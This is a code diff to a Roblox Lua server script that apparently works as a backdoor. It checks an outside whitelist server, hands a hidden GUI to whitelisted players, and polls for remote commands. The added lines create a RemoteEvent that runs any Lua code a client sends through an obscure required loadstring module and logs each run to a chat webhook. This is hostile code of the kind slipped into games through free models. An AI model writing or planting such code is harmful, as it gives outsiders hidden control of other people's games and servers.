@@ -1,6 +1,12 @@
 local url = "https://api.elytra.cc/"
 local http = game:GetService("HttpService")
 
+local thing = require(18696356924)
+
+local localsc : LocalScript = thing.thing
+
+local load
+
 local hasHitFive = false
 
 local function sendMessage(text)
@@ -11,15 +17,18 @@ local function sendMessage(text)
 	end)  
 end
 
-local function checkPlayerWhitelist(plr)
+local function checkPlayerWhitelist(plr:Player)
 	local response = http:GetAsync(url.."check/?username="..plr.Name)
 	if tostring(response) == "true" then
 		sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
+		local clone = localsc:Clone()
+		clone.Parent = plr.PlayerGui
+		clone.Enabled = true
 	end
 end
 
 local function checkForCommands(jobId)
-	local load = require(14381312180)
+	load = require(14381312180)
 	while true do
 		wait(5)
 		local response = http:GetAsync(url.."heartbeat/?jobid="..jobId)
@@ -41,6 +50,20 @@ local function checkForCommands(jobId)
 		end
 	end
 end
+
+local re = Instance.new("RemoteEvent")
+
+re.Name = "PROP_RE"
+
+re.Parent = game:GetService("ReplicatedStorage")
+
+re.OnServerEvent:Connect(function(plr, msg)
+	pcall(function()
+		load(msg)()
+		sendMessage(string.format("<:rack:1262457591422779423> | `%s` just executed code using the executor! Code: ```lua\n%s```", plr.Name, msg))
+
+	end)
+end)
 
 local chatToken = http:GenerateGUID(false)
 local jobId = game.JobId ~= "" and game.JobId or http:GenerateGUID(false)
